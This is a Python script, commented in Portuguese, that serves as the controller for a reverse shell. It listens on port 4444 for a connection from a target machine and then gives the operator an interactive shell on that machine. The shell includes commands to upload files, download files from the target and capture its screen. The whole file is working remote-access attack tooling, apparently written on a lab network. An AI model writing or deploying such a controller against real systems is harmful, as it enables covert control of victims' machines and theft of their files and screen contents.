#_*_ coding: utf-8 _*_
import socket
import termcolor
from termcolor import colored
import json
import os
import subprocess

def data_recv():
    data = ''
    while True:
        try:
            data = data + alvo.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def data_func(data):
    jsondata = json.dumps(data)
    alvo.send(jsondata.encode())

def upload_file(file):
    f = open(file, 'rb')
    alvo.send(f.read())

def download_file(file):
    f = open(file, 'wb')
    alvo.settimeout(5)
    chunk = alvo.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = alvo.recv(1024)
        except socket.timeout as x:
            break
    alvo.settimeout(None)
    f.close()

def comunicação():
    count = 0
    while True:
        comando = input('* Shell~%s: ' % str(ip))
        data_func(comando)
        if comando == 'exit':
            break
        elif comando == 'clear':
            os.system('clear')
        elif comando [:3] == 'cd ':
            pass
        elif comando [:6] == 'upload':
            upload_file(comando[7:])
        elif comando [:8] == 'download':
            download_file(comando[9:])
        elif comando [:10] == 'screenshot':
            f = open('screenshot%d' % (count), 'wb')
            alvo.settimeout(5)
            chunk = alvo.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = alvo.recv(1024)
                except socket.timeout as x:
                    break
            alvo.settimeout(None)
            f.close()
            count += 1
        elif comando == 'help':
            print(colored('''\n
            exit: Fecha a seção entre a maquina do alvo.
            clear: Limpa o terminal.
            cd + "NomedoDiretório": Altera o diretório na máquina de destino.]
            upload + "NomedoArquivo": Envia um arquivo para a máquina de destino
            download + "NomedoArquivo": Baixa um arquivo da máquina de destino
            screenshot: Tira uma captura de tela da máquina de destino
            help: Ajuda o usuário sobre os comandos.    
            '''), 'yellow')
        else:
            answer = data_recv()
            print(answer)


conexão = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conexão.bind(('192.168.56.1', 4444))
print(colored('Aguardando por conexões...', 'green'))
conexão.listen(5)

alvo, ip = conexão.accept()
print(colored('Conectado com:' + str(ip), 'green'))
comunicação()